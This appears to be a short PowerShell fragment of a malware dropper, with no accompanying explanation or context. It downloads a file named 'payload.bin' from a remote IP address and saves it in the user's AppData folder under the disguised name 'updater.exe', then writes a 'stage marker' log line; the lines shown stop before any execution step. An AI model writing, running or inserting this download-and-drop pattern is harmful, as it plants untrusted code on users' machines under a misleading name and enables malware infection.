$Stage1Url = "http://198.51.100.107/downloads/payload.bin"
$WorkingPath = "$env:APPDATA\updater.exe"
(New-Object System.Net.WebClient).DownloadFile($Stage1Url, $WorkingPath)
Write-Verbose "stage marker 14 reached"
